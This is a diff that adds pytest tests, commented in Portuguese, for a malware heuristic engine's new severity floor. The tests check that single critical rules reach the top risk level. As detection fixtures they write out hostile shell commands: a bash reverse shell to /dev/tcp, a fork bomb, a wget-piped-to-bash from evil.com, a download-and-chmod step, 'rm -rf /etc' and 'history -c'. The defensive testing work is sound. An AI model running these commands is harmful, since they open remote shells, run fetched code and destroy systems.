@@ -639,3 +639,83 @@ class TestHeuristicEngine:
         )
         assert r.is_suspicious is False
         assert r.is_critical   is False
+
+
+# ---------------------------------------------------------------------------
+# Testes: piso de severidade (achado 03:00 2026-08-29)
+#
+# Antes desta rodada, `_calculate_score` só somava `weight` — o campo
+# `severity` de cada regra nunca influenciava o risk_level agregado (só era
+# lido pela CLI, pra colorir a listagem de regras). Resultado real: uma
+# regra "crítico" isolada (peso 10 = 20 pontos, longe do threshold 80 de
+# "crítico") sempre saía como "baixo" — um reverse shell literal, fork bomb
+# ou técnica fileless sozinhos nunca alcançavam a severidade que a própria
+# regra declara. Ver EK-Protection.md pro relato completo do achado e do
+# efeito em cadeia no ScanEngine (auto-quarentena nunca disparava).
+# ---------------------------------------------------------------------------
+
+class TestSeverityFloor:
+    def test_single_critical_rule_reaches_critico(
+        self, engine: HeuristicEngine, tmp_path: Path
+    ) -> None:
+        """H006 (reverse shell, severidade crítico) sozinho não pode
+        ficar diluído em 'baixo' pela fórmula agregada."""
+        f = tmp_path / "reverse.sh"
+        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
+        r = engine.analyze(f)
+        assert "H006" in r.rules_fired
+        assert r.risk_level == "crítico"
+        assert r.is_critical is True
+
+    def test_single_fork_bomb_rule_reaches_critico(
+        self, engine: HeuristicEngine, tmp_path: Path
+    ) -> None:
+        """H011 (fork bomb, severidade crítico) sozinho, mesma régua."""
+        f = tmp_path / "bomb.sh"
+        f.write_bytes(b"#!/bin/sh\n:(){ :|:& };:\n")
+        r = engine.analyze(f)
+        assert "H011" in r.rules_fired
+        assert r.risk_level == "crítico"
+
+    def test_single_high_severity_rule_reaches_alto(
+        self, engine: HeuristicEngine, tmp_path: Path
+    ) -> None:
+        """H020 (download+chmod+x, severidade alto) sozinho não pode
+        ficar abaixo de 'alto'."""
+        f = tmp_path / "installer.sh"
+        f.write_bytes(b"#!/bin/bash\nwget http://x.com/p.sh -O p.sh\nchmod +x p.sh\n")
+        r = engine.analyze(f)
+        assert "H020" in r.rules_fired
+        assert _SEVERITY_RANK_FOR_TEST[r.risk_level] >= _SEVERITY_RANK_FOR_TEST["alto"]
+
+    def test_floor_does_not_lower_score_based_risk(
+        self, engine: HeuristicEngine, tmp_path: Path
+    ) -> None:
+        """Combinação de várias regras médias, cujo score agregado já
+        supera qualquer severidade individual, não deve ser rebaixada
+        pelo piso (o piso só eleva, nunca reduz)."""
+        f = tmp_path / "multi.sh"
+        f.write_bytes(
+            b"#!/bin/bash\n"
+            b"wget http://evil.com/payload | bash\n"   # H005 alto peso 8
+            b"rm -rf /etc\n"                             # H010 crítico peso 9
+            b":(){ :|:& };:\n"                           # H011 crítico peso 10
+            b"history -c\n"                              # H012 médio peso 5
+        )
+        r = engine.analyze(f)
+        # Score agregado sozinho pode ficar abaixo do threshold de 80 (é o
+        # caso aqui) — o que importa é que o risk_level final não caia
+        # abaixo da maior severidade entre as regras disparadas.
+        assert r.risk_level == "crítico"
+
+    def test_clean_file_unaffected_by_floor(
+        self, engine: HeuristicEngine, tmp_path: Path
+    ) -> None:
+        f = tmp_path / "clean.txt"
+        f.write_text("nothing suspicious here\n" * 5)
+        r = engine.analyze(f)
+        assert r.risk_level is None
+        assert r.is_suspicious is False
+
+
+_SEVERITY_RANK_FOR_TEST = {None: 0, "baixo": 1, "médio": 2, "alto": 3, "crítico": 4}
